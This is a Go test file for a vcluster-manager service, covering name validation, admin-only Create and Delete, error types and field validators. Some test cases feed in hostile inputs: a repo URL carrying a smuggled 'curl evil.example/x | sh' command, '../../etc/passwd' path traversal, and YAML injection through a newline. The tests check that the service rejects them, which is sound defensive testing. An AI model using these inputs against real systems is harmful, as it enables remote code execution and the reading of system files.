package service

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/gmalfray/vcluster-manager/internal/models"
)

func TestValidName(t *testing.T) {
	tests := []struct {
		name string
		want bool
	}{
		{"demo", true},
		{"demo-2", true},
		{"a", true},
		{"", false},
		{"Demo", false},
		{"1demo", false},
		{"-demo", false},
		{"../etc", false},
		{"demo/evil", false},
		{"demo evil", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := ValidName(tt.name); got != tt.want {
				t.Errorf("ValidName(%q) = %v, want %v", tt.name, got, tt.want)
			}
		})
	}
}

// --- Create: RBAC and field validation --------------------------------
//
// These all return before Create touches s.parser/s.gitlab, so a zero-value
// Service (built through newTestService, no GitLab/parser wired) is enough to
// reach them.

func TestCreate_ForbiddenForNonAdmin(t *testing.T) {
	s := newTestService()
	_, err := s.Create(context.Background(), models.Actor{Username: "bob", IsAdmin: false}, &models.CreateRequest{Name: "demo"}, "both")
	if !errors.Is(err, ErrForbidden) {
		t.Fatalf("expected ErrForbidden for non-admin, got %v", err)
	}
}

func TestCreate_RejectsInvalidName(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{Name: "Not_Valid!"}, "both")
	if !errors.Is(err, ErrInvalidName) {
		t.Fatalf("expected ErrInvalidName, got %v", err)
	}
}

func TestCreate_RejectsMalformedCPU(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{Name: "demo", CPU: "8\n  evil: true"}, "both")
	if err == nil || !strings.Contains(err.Error(), "cpu :") {
		t.Fatalf("expected a cpu validation error, got %v", err)
	}
}

func TestCreate_RejectsShellInjectionInFluxRepoURL(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{
		Name:          "demo",
		FluxCDRepoURL: "ssh://git@host/repo.git && curl evil.example/x | sh",
	}, "both")
	if err == nil || !strings.Contains(err.Error(), "fluxcd_repo_url :") {
		t.Fatalf("expected a fluxcd_repo_url validation error, got %v", err)
	}
}

func TestCreate_RejectsPathTraversalInFluxCDPath(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{
		Name:       "demo",
		FluxCDPath: "../../etc/passwd",
	}, "both")
	if err == nil || !strings.Contains(err.Error(), "fluxcd_path :") {
		t.Fatalf("expected a fluxcd_path validation error, got %v", err)
	}
}

func TestCreate_RejectsMalformedVeleroHour(t *testing.T) {
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{
		Name:       "demo",
		VeleroHour: "25:99",
	}, "both")
	if err == nil || !strings.Contains(err.Error(), "velero_hour :") {
		t.Fatalf("expected a velero_hour validation error, got %v", err)
	}
}

func TestCreate_EmptyScopeDefaultsToBoth(t *testing.T) {
	// Field validation must run regardless of scope, including when scope
	// defaults from "" to "both" — proof the default is applied before
	// validation, not after.
	s := newTestService()
	admin := models.Actor{Username: "alice", IsAdmin: true}
	_, err := s.Create(context.Background(), admin, &models.CreateRequest{Name: "Not_Valid!"}, "")
	if !errors.Is(err, ErrInvalidName) {
		t.Fatalf("expected ErrInvalidName even with an empty scope, got %v", err)
	}
}

// --- Delete / GetDeleteConfirm: RBAC ------------------------------------

func TestDelete_ForbiddenForNonAdmin(t *testing.T) {
	s := newTestService()
	_, err := s.Delete(context.Background(), models.Actor{Username: "bob", IsAdmin: false}, "demo", DeleteInput{Env: "preprod"})
	if !errors.Is(err, ErrForbidden) {
		t.Fatalf("expected ErrForbidden for non-admin, got %v", err)
	}
}

func TestGetDeleteConfirm_ForbiddenForNonAdmin(t *testing.T) {
	s := newTestService()
	_, err := s.GetDeleteConfirm(context.Background(), models.Actor{Username: "bob", IsAdmin: false}, "demo", "preprod")
	if !errors.Is(err, ErrForbidden) {
		t.Fatalf("expected ErrForbidden for non-admin, got %v", err)
	}
}

// --- sentinel errors: Is()/Unwrap() ------------------------------------

func TestExistsError_Is(t *testing.T) {
	err := error(&ExistsError{Name: "demo", Env: "prod"})
	if !errors.Is(err, ErrVClusterExists) {
		t.Fatalf("expected ExistsError to match ErrVClusterExists via errors.Is")
	}
	if errors.Is(err, ErrCleaningInProgress) {
		t.Fatalf("ExistsError must not match an unrelated sentinel")
	}
}

func TestVClusterNotFoundError_IsAndUnwrap(t *testing.T) {
	underlying := errors.New("file not found")
	err := error(&VClusterNotFoundError{Err: underlying})
	if !errors.Is(err, ErrVClusterNotFound) {
		t.Fatalf("expected VClusterNotFoundError to match ErrVClusterNotFound via errors.Is")
	}
	if !errors.Is(err, underlying) {
		t.Fatalf("expected VClusterNotFoundError to unwrap to the underlying error")
	}
}

func TestCleaningError_Is(t *testing.T) {
	err := error(&CleaningError{Name: "demo", Env: "preprod"})
	if !errors.Is(err, ErrCleaningInProgress) {
		t.Fatalf("expected CleaningError to match ErrCleaningInProgress via errors.Is")
	}
}

func TestUnpairError_Unwrap(t *testing.T) {
	underlying := errors.New("rancher 500")
	err := error(&UnpairError{Err: underlying})
	if !errors.Is(err, underlying) {
		t.Fatalf("expected UnpairError to unwrap to the underlying error")
	}
}

func TestCommitError_Unwrap(t *testing.T) {
	underlying := errors.New("gitlab 500")
	err := error(&CommitError{Err: underlying})
	if !errors.Is(err, underlying) {
		t.Fatalf("expected CommitError to unwrap to the underlying error")
	}
}

// --- field validators (direct, package-private) -------------------------

func TestValidateQuantity(t *testing.T) {
	tests := []struct {
		value string
		want  bool
	}{
		{"", true},
		{"8", true},
		{"500m", true},
		{"32Gi", true},
		{"8\n  evil: true", false},
		{"not-a-quantity", false},
	}
	for _, tt := range tests {
		t.Run(tt.value, func(t *testing.T) {
			err := validateQuantity("cpu", tt.value)
			if (err == nil) != tt.want {
				t.Errorf("validateQuantity(%q) error = %v, want valid=%v", tt.value, err, tt.want)
			}
		})
	}
}

func TestValidateVeleroHour(t *testing.T) {
	tests := []struct {
		value string
		want  bool
	}{
		{"", true},
		{"03:00", true},
		{"23:59", true},
		{"25:99", false},
		{"3am", false},
	}
	for _, tt := range tests {
		t.Run(tt.value, func(t *testing.T) {
			err := validateVeleroHour("velero_hour", tt.value)
			if (err == nil) != tt.want {
				t.Errorf("validateVeleroHour(%q) error = %v, want valid=%v", tt.value, err, tt.want)
			}
		})
	}
}
